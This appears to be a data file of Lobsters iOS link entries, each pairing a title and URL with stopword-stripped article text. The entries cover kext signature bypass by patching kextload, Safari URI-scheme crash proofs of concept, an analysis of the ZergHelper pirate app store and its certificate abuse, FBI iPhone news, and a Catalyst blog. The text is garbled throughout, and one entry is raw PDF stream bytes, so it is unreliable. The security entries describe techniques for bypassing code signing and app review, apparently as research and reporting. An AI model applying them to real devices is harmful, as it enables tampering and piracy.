parsemachfile phase responsible loading macho well verifying code signature present might ask relevant o x since unlike io mandatory userspace code signing quite happily execute unsigned code anyway o x use userspace code signing enforce entitlement xml blob stored macho signed part code signature kernel code check whether user space process particular entitlement via iotaskhasentitlement kernel kext loading code accept load request process running root also comapplerootlesskextmanagement entitlement particularly important since o x kext code signature enforced userspace mean kextmanagement entitlement vital part separation root userspace kernel code execution two system binary kextmanagement entitlement kextd kextload order defeat kernel code signing need first exec suidroot binary get root exec either kextload kextd get right entitlement patching kextload kextload probably easier target binary patch since standalone tool load kext without talking kextd need patch checkaccess function kextload think reach kextd try load kext patch call checkkextsignature checksignaturesofdependents kextload think succeeded load kext signed unsigned released exploit contain binary patch file remove signature check kextload o x well simple helloworld kext loadkextsh unloadkextsh script load unload run regular user look consoleapp see kernel debug printf output
391,Lobsters,ios,Apple iOS,Dancing on the Lip of the Volcano: Chosen Ciphertext Attacks on Apple iMessage,https://isi.jhu.edu/~mgreen/imessage.pdf,dancing lip volcano chosen ciphertext attack apple imessage,,obj length filter flatedecode stream l qtq l n mv b u ql c
392,Lobsters,ios,Apple iOS,"FBI says it might be able to break into seized iPhone, wants hearing vacated",http://arstechnica.com/tech-policy/2016/03/fbi-says-it-might-be-able-to-break-into-seized-iphone-wants-hearing-vacated/,fbi say might able break seized iphone want hearing vacated,update agreed original story filed seizure iphone ordered reported discovered said livestreamed,update pdt u magistrate sheri pym agreed cancel tuesday hearing tentatively stayed earlier order requiring apple assist fbi unlocking iphone apple object original story federal bureau investigation said monday might able break seized iphone center encryption battle apple want federal judge overseeing litigation vacate tuesday hearing whether apple assist authority bypassing fourdigit passcode iphone used san bernardino terrorist syed farook according court document filed monday sunday march outside party demonstrated fbi possible method unlocking farook iphone testing required determine whether viable method compromise data farook iphone government said u magistrate judge sheri pym yet ruled government motion waiting court rule motion said thom mrozek justice department spokesman los angeles government said filing following seizure iphone december fbi cease effort litigation began break phone fbi continued conduct research result worldwide publicity attention case others outside u government continued contact u government offering avenue possible research filing continued government name provided advice say might unlock phone last month judge pym ordered apple code software assist authority breaking phone apple objected saying amounted encryption backdoor pym scheduled highprofile court hearing matter riverside county federal court among thing apple claimed order violated constitutional right speech due process pym agreed government writ act law gave judge power issue order like one case despite fact law book requiring assistance reuters meanwhile reported tuesday group u senator began circulating draft legislation would give federal judge clear legal basis issue order like one apple case development came day reported researcher discovered flaw could allow attacker decrypt small part iphone operating system imessage flaw however might little benefit fbi pulling data iphone however bug underscore security people long excruciatingly hard get right common bug often leave opening law enforcement agent criminal hacker hour government filing apple ceo tim cook said livestreamed product launch event expect position odds government believe strongly responsibility help protect data protect privacy owe customer owe country issue impact u ar senior business editor cyrus farivar contributed report riverside calif
394,Lobsters,ios,Apple iOS,A set of URI schemes bugs that lead Safari to crash/freeze.,https://github.com/pwnsdx/iOS-URI-Schemes-Abuse-PoC,set uri scheme bug lead safari crashfreeze,iosurischemesabusepoc fixed safari technology preview exploit user must type uri address bar press enter fixed safari technology preview exploit work user least one mailbox setup fixed io macos sierra exploit require user either accept popup click link fixed io macos sierra exploit,iosurischemesabusepoc set uri scheme bug lead safari crashfreeze show uri scheme weakness used nasty thing apple aware issue decided start looking uri scheme crashsafaricom massacre wanted find way break safari fileattackhtml file bug crash user current tab without specific requirement fixed safari technology preview exploit file bug crash browser io crash current tab o x user must type uri address bar press enter fixed safari technology preview exploit mailtoiframeattackhtml mailto bug freeze safari safarifirefox mailapp o x sending bunch data mailto uri scheme work user least one mailbox setup fixed io macos sierra exploit smsattackhtml sm bug freeze sm app sending lot data sm uri scheme require user either accept popup click link fixed io macos sierra exploit
395,Lobsters,ios,Apple iOS,Pirated iOS App Store‚Äôs Client Successfully Evaded Apple iOS Code Review,http://researchcenter.paloaltonetworks.com/2016/02/pirated-ios-app-stores-client-successfully-evaded-apple-ios-code-review/,pirated io app store client successfully evaded apple io code review,created post zerghelper spreading functionality oschina novel approach act party app store nonjailbroken device fake tiny itunes client simulate xcode apply personal development certificate apple began provide new program information posted authorize pirated apps pc abusing enterprise certificate zerghelper sample wild potential security risk apple code review findandcall jekyll xcodeghost instaagent reviewer check apps enterprise certificate wirelurker yispecter youmi apple id keyraider appbuyer yispecter code dynamic loading wax android trojan xbot mitigation acknowledgement author surge iocs sample app store version drm stripped sample enterprise signed version related domain get update palo alto network,post also available Êó•Êú¨Ë™û japanese apple official io app store well known strict code review app submitted developer mandatory policy become one important mechanism io security ecosystem ensure privacy security io user recently identified app demonstrated new way successfully evading apple code review post discus finding potential security risk io device user app identified named ÂºÄÂøÉÊó•Â∏∏Ëã±ËØ≠ happy daily english since removed apple app store app complex fully functional third party app store client io user mainland china also discovered enterprise signed version application elsewhere wild identified malicious functionality app classified riskware named zerghelper figure happy daily english available app store zerghelper present several security risk include following provides installation modified version io apps whose security ensured abuse enterprise certificate personal certificate sign distribute apps may include code reviewed abuse private apis asks user input apple id also share apple id user log apple server using id perform many operation background author trying extend capability via dynamic updating code could bypass io security restriction us novel technique sensitive risky technique could used malware attack io ecosystem zerghelper appears gotten apple app review process performing different behavior user different physical location earth user outside china would act claimed english studying app however accessing app china real feature would appear app made available app store october however nobody appeared noticed zerghelper hidden functionality february user created post chinese developer forum discus shared finding apple february apple removed app app store later day zerghelper main functionality appeared provide another app store includes pirated cracked io apps game app developed company china named main product xy helper zerghelper nonjailbroken official app store version product addition abuse enterprise certificate riskware used new novel approach install apps nonjailbroken device reimplemented tiny version apple itunes client window login purchase download apps also implemented functionality apple xcode ide automatically generate free personal development certificate apple server sign apps io device mean attacker analyzed apple proprietary protocol abused new developer program introduced eight month ago zerghelper also share valid apple id user need use id zerghelper code complex still unclear whether would steal account information send back server app send device information automatically server statistic tracking author appeared trying use programming language lua make app extensible specifically zerghelper use framework mean code could remotely updated without apple review also identified zerghelper apps signed enterprise certificate apps spread author different channel zerghelper spreading functionality zerghelper designed installed way io user accessed xy helper official website china top advertisement banner would prompt page saying could go app store install product xy apple helper left figure clicking button official app store automatically opened happy daily english app page shown right figure original happy daily english app opensourced hosted oschina project named zerghelper author compiled embedded risky code appear least three people jointly developing using usernames xi zhang zhangzq project internal name xyfactory app internal name figure official website guide user download zerghelper app store browse app using desktop browser itunes client platform app name would shown ÂºÄÂøÉÊó•Â∏∏Ëã±ËØ≠ happy daily english however installed iphone ipad name became xyÂä©Êâã xy helper logo like value cfbundledisplayname app infoplist file figure analysis suggests author inputted different name submitting app apple web form apple review process identify inconsistency figure app name inconsistent itunes page app launched would connect url interface xyzscom immediately take different reaction based result http request figure webpage configured return error access come ip address outside mainland china situation app would display english study interface left figure functionality provided user region figure app provices different functionality based http request result figure different interface showed user different location know app store reviewer located located mainland china method could trick seeing legitimate app even china author could shut webpage review period reviewer could see actual functionality analysis behavior user china different user interface would appear right figure app guide install two configuration profile claim resolving stability issue actually install device enrollment challenge web clip figure profile signed certificate xyzscom issued go daddy secure certificate authority december note device enrollment challenge used enroll device related mdm mobile device management system figure app asks install two profile signed certificate issued godaddy app provided functionality directly installing plenty io apps game device page hot apps hot game top grossing apps etc like official app store figure difference apps game provided zerghelper free mean likely pirated version legitimate apps figure main user interface setting tab device using version io user could also input apple id password password would remembered app another button used apple id would like receive one free figure identified apple id came figure apple id would like receive one free novel approach act app store nonjailbroken device zerghelper used unique way build thirdparty app store nonjailbroken io device could used spread pirated cracked io apps two new method getting past app store review previously observed fake tiny itunes client zerghelper implemented protocol itunes client pc apple app store server specific functionality implemented app log app store cache authentication data log account click term service get app information purchase app figure download purchased app communicating apple server zerghelper used user agent like window microsoft window business edition window microsoft window business edition hence app trying act itunes client running window system figure code purchase app simulating itunes protocol still clear way zerghelper used functionality possible used apple id given user free apple id provided app simulate xcode apply personal development certificate surprising approach installing apps nonjailbroken device zerghelper abused free personal development certificate previously apple offered io development certificate registered developer paid annual fee kind certificate necessary anyone sign app run physical device june apple began provide new program allows anyone apple id receive certificate free functionality embedded xcode since version far xcode official way use feature however zerghelper could acted xcode receive valid personal development certificate apple authentication server apple disclose process work xcode implemented therefore think someone reverseengineered xcode detail analyze part code implement exactly behavior xcode effect successfully cheating apple server figure login apple server figure fetch development certificate using development certificate zerghelper could sign io apps io device install limit number io device authorized use certificate previously people worried whether free certificate would abused someone install pirated apps technique show abuse wideranging automated way week analyzing zerghelper observed someone selling source code automatically register apple id reversing protocol phone pc offer app drm authentication pc helper utility automatically generates personal development certificate apple id information posted famous security forum china february deleted february figure deleted post selling related source code screenshot authorize pirated apps pc pirated apps downloaded zerghelper server app asks user connect iphone ipad pc authentication help xy helper window version reverseengineered window client far know purpose behind implement window client like itunes trick io device believing io app authorized pc attack technique use tool year abusing enterprise certificate zerghelper also abused enterprise certificate manner similar previously identified io malware including wirelurker yispecter tinyv app kind apps tagged install second zerghelper used itmsservice protocol apps installation compared previous malware main difference zerghelper would download itmsservice plist file server could also open local port install apps onsite feature may designed apps signed personal certificate figure enterprise signed apps plist file hosted either remote server local device zerghelper sample wild apple app store one channel zerghelper distributed author also developed version signed different enterprise certificate version distributed different channel could installed nonjailbroken device example access xy helper website could choose install app store directly server found zerghelper sample signed nine different enterprise certificate xychannelidplist file author specified different channel id different channel name figure one enterprise certificate used sign zerghelper potential security risk apple code review previously malware eg findandcall proofofconcept apps eg jekyll successfully made official app store recent case xcodeghost instaagent compared zerghelper user interface significantly suspicious code characteristic apple typically disclose technical detail regarding reviewer check apps confirm malicious zerghelper demonstrates new technique evade apple reviewer scrutiny enterprise certificate since wirelurker malware evasive application installed io abusing enterprise certificate biggest risk around issue combination enterprise certificate private apis yispecter youmi abused private apis collect private information io zerghelper took another step automatically generate development certificate free concern abuse certificate may first step toward future attack apple id underground market io tool apple id become important recent month seen malware designed steal apple id eg keyraider take money eg appbuyer share eg yispecter attacker ransom stolen apple id phish zerghelper functionality also relied valid apple id still certain whether zerghelper could send stolen apple id back server note zerghelper would provide free apple id user know id originated use apple id continues grow especially consider amount private data stored icloud iphones ipads code dynamic loading apple requires every single update app app store reviewed publishing zerghelper rereview increase possibility exposure author appear tried resolve problem using scripting language zerghelper used open source project called wax framework let write native iphone apps lua app xyliblua file contains two function far lua plugin loaded executed app first launch wax library script could invoke many method objectivec runtime figure lua plugin zerghelper apple disallows io app dynamically loading new code dynamically updating important useful security mechanism mitigate risk kind vulnerability malware however framework sdks like wax provide another way bypass restriction dynamic code loading classic method used malware hide author true intention last year popular io sdks provide javascript lua script language interface objectivec runtime emerged considering easy write code language hard analyze detect think approach may adopted malware puas every popular platform example android trojan xbot recently revealed used javascript implement part core functionality mitigation reported issue apple february apple removed app app store february io user installed ÂºÄÂøÉÊó•Â∏∏Ëã±ËØ≠ app store found xyÂä©Êâã device suggest uninstall also suggest user check profile io device setting general profile device management profile xyzscom delete immediately acknowledgement greatly appreciate help analysis also would like thank author surge creating awesome tool greatly helped analysis zerghelper last thank ryan olson chad berndtson palo alto network assistance developing report iocs sample app store version drm stripped englishstudy sample enterprise signed version related domain http interface xyzscom http tongji xyzscom http download xyzscom http xyzscom http software xyzscom http stat daskingnetcom get update palo alto network sign receive latest news cyber threat intelligence research u
396,Lobsters,ios,Apple iOS,WWDC Wish List,http://blog.steventroughtonsmith.com/post/140141855080/wwdc-wish-list,wwdc wish list,humble broadcast development journal kept twitter prototype future update around third drag drop developer pledge support available app store available iphone ipad unleashed upon world applescript support catalyst development thread live app store find github indeed possible catalyst apps submit feedback catalyst previously documented many reason available uikit macos loading appkit bundle using appkit technically possible however list thing appreciate appkit auxiliary panel sheet proxy icon color picker cursor dock menu bar status item nsworkspace nstask system applescript earlier post service apple legacy tutorial swiftui like microsoft radar building analogy macstories tentpole feature xcode io playground pythonista io rumor terminal environment io went built darwin mosh openterm ish systemlevel drawingmarkup view apple pencil opengles custom view controller nonui extension provider extension audio unit extension key upkey event using private api mouse support api capture mouse cursor quake larger ipads external touch screen support io drafting table threecolumn view surface book turn expanded usb device support io mfi eyetv tuner game capture ftdi cable readwrite external drive file app formatpartition external volume readwrite disk image scripting shifted dramatically hundred shortcut workflow virtual machine hypervisorframework let developer build virtual machine mini vmac entitlement entitlement apply apple reminiscing twitter openstep relatively simple announced older,u list project like someday star align one thing back mind something color missing part io always bugged comprehensive support color system level one favorite bit ui since early day mac o x system color panel originally nextstep beautifully comprehensive wheel slider palette crayon swatch amazing eyedropper tool supported throughout cocoa apps mac mac apps make use color well control somewhere ui drag drop color apps even onto rich text system editor color fundamental type object desktop macos love io never gained standard color picker ui platform used artist everywhere amazing creative apps firstparty stylus accessory apple yet everybody reinvent color wheel uikit apps come mac via catalyst even jarring uikit way invoke system color picker one thing io support drag drop color never know iwork suite let drop color onto shape object fill mail safari let drop color onto rich text style thirdparty apps free implement color drag drop year although select like mindnode concept humble broadcast development kicked high gear started prototyping app manage collect color interapp drag drop support called pastel might following along development journal kept twitter like project day started mac catalyst app spent much early development brought ipad later iphone really love direction workflow opposite direction catalyst developer would go force care complexity mac first distilling something fit tiny screen allows faster development cycle building io simulator device really three scenario want color palette library app whilst developing apps web page whilst designing new piece artwork usually pixel artwork game prototyping keeping paint diary painting miniature built pastel entirely around first two scenario prototype future update around third think reflected throughout ui copy variety io developer representation instance tiny bitmap version palette context menu intentionally avoided building kind feature professional artist designer might want expect lovingly recreated whole bunch macos nscolorpanel io including favorite tab crayon picker nt much work sound pretty fun experience especially little thing like determining exactly color slider work update realtime drag drop key making pastel part advanced workflow ipad supporting drag drop pick color palette drop inside another app crazy cool see developer pledge support apps raised awareness potential capability color drag drop part io open anybody would great see place love pastel fun halo app kind scenario love even spur apple providing systemwide color picker morecomprehensive color support future version io make even interesting next update pastel likely available time read mode let use pastel splitscreen color picker window drag supporting apps available app store sounded interesting pastel available iphone ipad free try library cap item inapppurchase like want unlock larger library mac version pastel something pick sometime wwdc intention launching later summer universal purchase wo nt pay anything extra launch blast working pastel really hope like feel free send picture pretty palette library create please consider supporting color drag drop apps way back built mini streaming radio player app use home give family included local irish radio station simplistic vanilla ui true minimum viable product worked barely enough satisfy wanted put mobileradio shelf time forgotten pile abandoned project never really thought going back announcement catalyst uikit macos wwdc figured would fun build catalyst app ground mac initial intention bringing iphone ipad trawled project folder came across mobileradio figured would perfect example put lot love building radio app mac using uikit delved deep talking appkit necessary try build experience worthy macos using apple new podcasts app template replicated ui using latest apis technology io relying heavily context menu point intention shipping radio app macos otherwise inspired developer debuting catalyst apps launch macos catalina excitement figured could make showcase product sort named hcc radio high caffeine content included preset irish radio station unleashed upon world figured pretty good example catalyst respectful mac user experience thus far hcc radio done well limited niche irish radio streaming apps one interesting question last year around applescript support catalyst marzipan apps possible sure idea app would make app review took upon build applescripting hcc radio illustrate macos uh deep cut app built io apis hcc radio fun side project something really motivating actually shipping software compelled try bringing app io unlike catalyst project hcc radio built first mac next obvious choice bring ipad conceptually similar many way ipad would able reuse existing structure app iphone would require rethink navigation wanted build kind ipad app people like want much blownup iphone app really happy turned going bring io expand app new feature needed better product name broadcast born broadcast unlike hcc radio full support adding station collection syncs icloud run io ipados mac retains applescript support whereas io support mouse trackpad pulldown command menu discoverable keyboard shortcut like hcc radio broadcast free app preset irish radio station want unlock editing feature asks simple inapp purchase subscription monthly fee required app universal purchase buy iphone ipad get mac version free vice versa first time ever shipped app inapp purchase pretty curious see land following development thread twitter pleased know broadcast live app store iphone ipad mac free go try hope like ipad ui much check mouse trackpad support let know kind feature like see next interesting rumor wwdc shortcut might coming mac course raise kind question future automation macos wwdc came went shortcut got huuge upgrade io like new conversational editor thirdparty action input output shortcut come mac turn catalyst macos catalina includes shortcut framework including one necessary bring almost entire ui built dummy app find github test harness nt really useful anything except explore idea shortcut mac would fit system would want product make fun demo shortcut consumer product brand unto think many u building library shortcut io would love way bring mac many io apps coming mac via catalyst likely never adopt applescript even though indeed possible catalyst apps could benefit let hope shortcut team find time busy takingovertheworld schedule bring shortcut macos submit feedback make sure know important wwdc new way write apps mac catalyst catalyst developerfacing name technology formerly known marzipan bringing ipad apps mac introducing uikit dozen framework io platform unifying substrate layer io macos catalyst apps built io sdk relatively change api set simply click mac checkbox project xcode get started previously documented far one could go mojave version uikit jumped enough hoop mean integrate applescript service many reason benefit catalystbased mac app deeply integrate system feature catalyst sdk hand go integrating mac appkit build best possible mac app uikit let take available uikit macos catalyst apps granted access nstoolbar part appkit sdk apps create rich window toolbars nstouchbar integrate touch bar wanted spawn appkit window appkit view hierachy augment app try use appkit class catalyst app rapidly run apiunavailablebegin io appkit class marked unavailable uikit app first glance seems pretty clear cut io sdk nt let touch appkit app however new unified process model macos catalina mean uikit app also appkit app could use loading appkit bundle since apple making point treat catalyst apps true mac apps mean app mac app embed appkitbased bundle framework load runtime plugin simply add new macos bundle target project embed new macos bundle app make inclusion conditional macos simple loadable bundle built mac sdk thus access appkit load manually detect running macos nsstring pluginpath nsbundle mainbundle builtinpluginspath stringbyappendingpathcomponent appkitgluebundle nsbundle bundlewithpath pluginpath load create principal class bundle remember add infoplist treat like entrypoint appkit land instantiate uikit code good go using appkit unified process model macos catalina uikit app nsapplication sharedinstance might expect appkit list app window like would nswindow appkit app give bridge modify app window way otherwise catalyst make impossible like changing window style mask setting position frame onscreen setting minimummaximum window size free spawn new window like load appkit nib storyboards whatever suit best everything running app free call selector uikit appkit might best use intermediary class pas message two since wo nt able import uikit appkit code one thing ca nt mix uikit appkit layer view hierarchy may technically possible kind thing would expect break moment another thing quite spawn new nswindow uikit view hierarchy however uikit code ability spawn new window scene appkit code ability take resulting nswindow presented hijack whatever want sense could spawn uikit window auxiliary palette kind feature clearly intended use catalyst push boundary make best software like expect fellow mac developer else using appkit uikit app enable let go martin pilkington fantastic list thing appreciate appkit see catalyst app improve auxiliary panel sheet spawn nspanel instance floating palette control app like tool palette also present complex appkit window sheet uikit window want little adventurous listen new window spawn use hijack uikitspawned window purpose perhaps make nonactivating floating panel present window sheet proxy icon set representedurl representedfilename primary window add proxy icon currently open document add icon window titlebar represent document point user drag drop proxy icon another app somewhere finder also commandclick proxy icon show document full path color picker bridge use nscolorpanel uikit app get rich native color picker use drive uikit ui color picker also load thirdparty color picker plugins many great example exist macos cursor change mouse cursor nscursor might expect system cursor custom image many mac apps change cursor based tool content interacting way catalyst app also give way showhide mouse cursor game capture wish dock update dock icon app runtime custom generated icon like progress bar long export operation add badge string also customize dock menu option runtime menu bar status item implement nsstatusitem appkit bundle provide menu bar icon like may used apps like dropbox status item dropdown menu many apps spawn borderless window simulate miniapp ui invoked status item theoretically might able present uikit app window status item little iphonesized region quite appropriate used full mac ipad app nsworkspace use nsworkspace move item trash reveal file finder load icon file disk among many thing nstask system nstask allows run shell command commandline apps pipe thing process appkit bundle uikit app support interaction applescript applescript service easier ever use follow previous instruction applescript section earlier post add apple event support app one tiny thing changed since mojave implementation longer need private aeinstallrunloopdispatcher call setupappleevents apple event already set might expect appkit good go decide best relay apple event uikit code action appropriate app service service let vend action system various type content like file image text etc service menu show context menu app offer service currently selected type content service show menu simply follow apple legacy tutorial implement service appkit bundle everything work see bridge appkit like make world difference maclike app feel user many way hybrid uikitappkit app give best world compatibility existing io codebase well able much possible give mac user thing expect good mac app apple starting use little bit catalyst mac apps like fullscreen imessage effect macos catalina sure accelerate future even something exciting new swiftui card apple lot thing built uikit thirdparty developer mac deserves able use uikit way need want build thing mac future bright catalyst apps dieter bohn make case apple go allin marzipan want apple force like okay ipad version mail version mail mac user inside apple get use nt like fix think many apps stomach nt everyone gon na use regular mac apps mean ask microsoft keeping window classic version office around trying change apps window window went nt go well vocal think uikit coming mac something excited much potential unifying software ecosystem across apple platform right ca nt stay fence like microsoft work need need make good hard imagine wanting use write kind software io make feel mac make io user feel really hope apple finally deciding marzipan decade io apple dominant platform mean apple longer fence mac v io divide made tough decision chart course future mac desktop apple provides next week wwdc bring uikit apps mac nt good enough need let know fix year step two multiyear transition inevitably leave u running universal iosmac apps arm mac plenty time fix thing nt standard expect mac apps mac platform prepare radar must allhandsondeck moment apple really nt think viable future mac marzipan fall flat face apple dominant ecosystem io ship sailed new ui framework declarative layer top going change arithmetic new app framework mac definition shared across io mac right back started time got point may native desktop apps left io still accelerating future new formfactors augmented reality whatever come next even native app development titan like adobe version photoshop development webassembly hard see appeal developer web amazing webgl webassembly enable kind powerful new platform however truly believe apple provides best native development framework world platform many highest quality consumer apps world steve job would explain next later cocoa framework presentation used building analogy love much developer write apps platform build upon foundation laid beneath next framework powerful like starting twentieth floor building building upwards developer ever going build three floor worth great app starting twentieth floor end twentythreefloor building os reinvent wheel every time new apps start lower floor fifth floor classic mac o started steve analogy three storey app would nt even reach high starting point next app next competitive advantage became apple competitive advantage later iphone competitive advantage competitive advantage native platform apple web would shame halfass transition marzipan concede defeat web apps desktop instead letting native apps reach height deserve still dividing apple attention one two native app framework ten floor tall always major constraint want see apple really transition painful apple yes think worth piece first appeared macstories may way back era io laid tentpole feature wanted see come io mac three year later many thing wishlist become reality probably good time revisit topic nt yet come pas plan new wishlist year come originally planned list developeruser split became clear two go handinhand complex thing io today using various automation apps step away needing thing developer xcode io much changed since development ipad much still stay apple introduced playground year provided swift ide ipad playground fantastic still build install app using mix match c objectivec code swift project structure code take place one file fine teaching material anybody wanting create something complex apple changed app store rule finally enable programming apps live io without fear removed albeit unfortunate restriction like able display output app screen however still way thirdparty programming app run code outofprocess user mistake crash app completely course way build install app locally using one ides pythonista io still incredible need something bridge gap programming environment io let design write build sign install application without resort using mac third party build apple app store rule platform restriction prevent anybody else able thus apple one build xcode io make powerful developer might need whilst also building mechanism o make safe secure possible many fundamental pillar necessary build xcode like nt exist io like useraccessible file system drag drop multiple window floating panel shortly rumor believed terminal environment io much like file system certain class user need commandline environment kind nt gone away sure apple hoped apple shortcut app user ever automating task io make perfect sense provide something power user need especially xcode io becomes reality went built sandboxed terminal app described post populated core bsd utility apple darwin demonstration seen mosh openterm much ish go far emulating linux environment try provide working shell io apps sandboxed using public apis apple capable building real thing nt install emulator ipad able curl url untar run ffmpeg convert local video file sandboxed terminal nt need let mess system apps provide way execute unsigned code kill process able live jail let whatever want inside much way gui user get whatever want shortcut maintaining safety security o systemlevel drawingmarkup view four year postapple pencil still apple provides developer apis drawing sketching markup every app reinvent wheel want pencilbased drawing may suit couple developer invested lot time effort drawing engine excludes every developer happens good idea way integrate sketching app apple provided sample code past sadly openglesbased want anything appropriate left scour github building drawing engine look good feel responsive promotion incredibly difficult yet apple great drawing framework o use note app would perfect provide developer several apps sitting shelf would benefit greatly builtin api drawing view hope apple get around sooner rather later custom view controller nonui extension provider extension powered many new apis io macos completely obviating plugin model robust outofprocess signed sandboxed mechanism however developer define extension point thus use empower apps programming environment io able run code extension separate process securely scoped task supposed crash wo nt bring host app course exactly apple playground app work nt something third party allowed access similarly able define uibased extension point apps implement extension would show inside app ever used audio unit extension point exactly let presenting custom uis various instrument audio processing apps installed region inside app ui audio app using coreaudio many way developer could innovate providing extension point fact much custom url ecosystem io sprang standardized way apps talk use function apple shortcut app workflow born custom url ecosystem apple realized potential great acquired workflow built o extension point could exposed action shortcut app let call transparently part workflow without ui instead dosado apps custom url involve today key upkey event seems crazy still unable track raw keyboard event io way barring using private api app allow hold physical key input like wasd key game modifier key like holding shift resizing something app like photoshop maintain aspect ratio developer know key pressed released shortcut invoked restriction seems pointless today incredibly restrictive affecting everything professional creative apps game ipad need robust hardware keyboard support chained restriction formulated decade ago different world mouse support api much way time robust mouse trackpad support io uikit coming mac framework add bunch interaction like right click hover scroll bar bring ipad user benefit choose workflow demand controlling ui absolute coordinate important function mouse forget mousecapturing relative movement essential game remote desktop emulator uikit thus need let capture mouse cursor need click thing onscreen combine robust keyboard support would able play game like firstperson shooter ipad like mac pc quake anyone android supported mouse nearly decade done anything lessen touch experience need worry io user workflow truly want need mouse ipad always nonstarter support one time barrier go away larger ipads external touch screen support time however computer want desk io drafting table ipad essentially blank canvas truer frontfacing button bigger canvas begets entirely new experience dying see io scale desktopsized workflow several apps onscreen desktop io device applequality large external touch screen would love ipad used mac laptop since ipad completely obviated formfactor grows ever powerful imagine ever going back people like apple need offer even bigger model ipad ipad pro already get custom uis expansive layout threecolumn view uikit mac behoove developer create apps layout scale screen anyway deeply envious surface book course turn something along line running io would suit need incredibly well expanded usb device support io mfi might gone usbc ipad pro developer need public apis write user mode driver anything wish plug ipad want able plug various eyetv tuner eyetv app happily init like mac want game capture work io record footage gaming pc actually able edit render fastest computer house ipad pro want plug raspberry ftdi cable view serial output ipad without buying crazy mfibased serial adapter whatever workflow might need burn cd dvd able plug disc drive using app designed task work way ipads simply today readwrite external drive file app wishlist need say long overdue imagine apple holding much longer like go formatpartition external volume readwrite disk image want read drive need able manage erase partition volume understand multiple file system image file apply disk image pervasive disk image support genuinely one crowning achievement result ton disk image two decade macos use disk image every day create cd floppy image pas file tofrom vmware qemu user file system access becomes core part using ipad need rest choose never use mac apple telling old data lost scripting applescript io one item list apple automation landscape shifted dramatically since apple acquired workflow shortcut perception applescript may long world slowly pushed favor sandboxed secure modern extension mechanism employed shortcut scripting still incredibly important evidenced hundred shortcut workflow used anybody take io seriously work day applescript really want see textual interface shortcut let thing without navigate fiddle ui filled action class advanced user prefers writing script thing need script need way run silently without presenting ui onscreen jumping apps scripting extended ui layer letting developer build richly scriptable apps like today mac applescript easy envision shortcut scripting using javascript swift shortcut already scripting action let run javascript webpage virtual machine hard see apple supporting virtualization io virtual machine require thing like justintime compilation execute arbitrary code memory violates one core foundation io security model burn battery life like task however apple provides webkit io also requires special security exception execute code memory macos provides hypervisorframework lightweight virtualization system let developer build virtual machine easily kind user would love see hypervisor io let company like vmware parallel bring expertise ipad offer approved way run armbased linux window couple year macos perhaps emulation may question perhaps wo nt always case sure developer library vms everything do nextstep older version macos iphone sdks course use vms io today opensource apps like bochs mini vmac sideloaded onto device nt ability jit run entirely using cpu emulation significantly slower burn battery entitlement finally brings entitlement entitlement system io allows apple finegrained control developer access feature wish use icloud app app must signed icloud entitlement similar requirement health home apple pay many part io carplay example need special entitlement nt given freely developer fact apply apple get app idea approved even let test feature app app developer ever found abusing privilege entitlement revoked apple app remotely disabled thus entitlement great way apple entrust developer partner special access feature developer never use misuse mind apple could entrust eg google microsoft mozilla entitlement need use real browser engine io instead webkit real chrome real firefox vmware parallel could entrusted build virtual machine emulator without leaving open attack vector malicious thirdparty apps disk utility could permitted partition disk ides could permitted run background process install apps attach debugger running apps many thing given freely developer would arguably make io much le safe place read powerful desktop computer entitlement mechanism place apple could still keep control want let get hand seeing past intercompany politics io going need method thing eventually especially io app ecosystem supplant mac app ecosystem due course mac without ability build install apps attach debugger would unimaginably crippled come long way fear enabling thirdparty apps iphone bring cell network trying actively build future io today like hand tied behind back io long relied fact mac exists fallback perform task apple nt ready rethink modern platform nt mean problem nt relevant worth solving left u situation io move forward new idea mac stand still needing keep compatibility io ecosystem whilst tiptoeing line keeping thing losing freedom power old system active development enthusiasm new correct path forward simply revert mechanism available desktop baggage come rethink thing fit modern secure world io exponentially better working file app drag drop automation background task splitscreen multitasking ipad stylus hardware keyboard ipad well completely hide complexity user nt need know mechanic system beyond tapping app open swiping home indicator close thing added io nt made o harder use transparent sure user nt even know exist user need become essential tentpoles io experience uikit desktop time revisit io app ca nt longer io apps apps nowwith rapidlyupcoming introduction uikit apps mac reminiscing twitter quite bit apple transition mac o x nextstep mac o found common ground despite two different os architecturally design standpoint couple different vector follow permit converge place one artifact final day next prerelease version nextstep despite appearing openstep operating system succeeded nextstep nextstep build abbreviate herein vastly different ui set apps new colored window chrome background image tabbed shelf bottom screen quite departure grayscale nextstep knew however builtin apps piqued interest redesigned rebuilt variant many apps shipped nextstep none change later made openstep fact nt resurface year later apple acquires next revamps openstep mac look feel project named rhapsody later became mac o x server fun track progression apps period let take look version mail follow way o x mail prerelease nextstep next recently sun finalized openstep confused openstep o crossplatform refactor sweeping revamp old nextstep framework seemed acrosstheboard revamp system apps take advantage openstep apps thanks openstep portability would run solaris window well next o however next actually shipped next version o renamed openstep nextstep nt include instead openstep older ironically preopenstep set apps despite shipping year beta tell immediately looking mail step backward mail openstep seems obvious hindsight fancy upgrade next working put shelf realized company future without acquisition perhaps build intended woo potential buyer like apple sure enough rhapsody includes revamped apps getgo mail rhapsody rhapsody apple first attempt merging world macintosh next architecturally much nextstep first build rhapsody released developer august seven month acquisition closed design goal developer beta relatively simple port openstep powerpc adopt mac hig design language iconography provide finder desktop see progression left openstep rhapsody developer release right mac o x serverrhapsody next ui nt maclike machine designed unix workstation professional academic market almost feel ui design language openstep mac o mouse keyboard os nt mean transitioning straightforward multitasking different menuing different famously next o never desktop menu bar across top screen even something simple like scrollbars control take granted today left nextstep apple teach next appkit maclike meant required lot work many year mac o x server maclikeness mac o x server still controlled preference key appkit fact switch completely revert system back looking like openstep wild experience mac o x server looked acted much like mac o pro look feel mac retained power unix next framework even built upon next feature like menu could tear float onscreen however mac o x server fatal flaw become apparent apple year since next acquisition mac o x server nt run legacy mac apps mac developer board rewriting everything completely objectivec appkit mac o x actually work successor mac o apple customer going gut start solution apple going port legacy mac o toolbox new compatibility library called carbon make linchpin consumer mac o x experience even apple knew wanted consumer rhapsody something special however became clear apple needed rethink strategy completely mac o x became completely different thing mac o x server preceded tentpole change would replace kernel driver model replace display postscript rendering pdfbased quartz deeply integrate carbon make legacy mac apps firstclass citizen adopt brand new ui called aqua lot next pure foundation framework rearchitected atop common foundation carbon classic mac o appearance manager became basis aqua ui appkit menu widgetcontrol rendering replaced mac o foundation course meant carbon apps cocoa appkit apps would look despite vastly different architecture apple needed show developer carbon going real valid way forward temporary stopgap committed using carbon mac o x finder carbon version finder introduced mac o x developer preview aqua revealed acted bit like next single root window file viewer toolbar column view secondary window stage apple nt quite know systemwide toolbars inherited nextstep mac o x developer preview first time saw aqua build came transformational change mac o x ui year three apple transition next technology apple path finding maclike rather 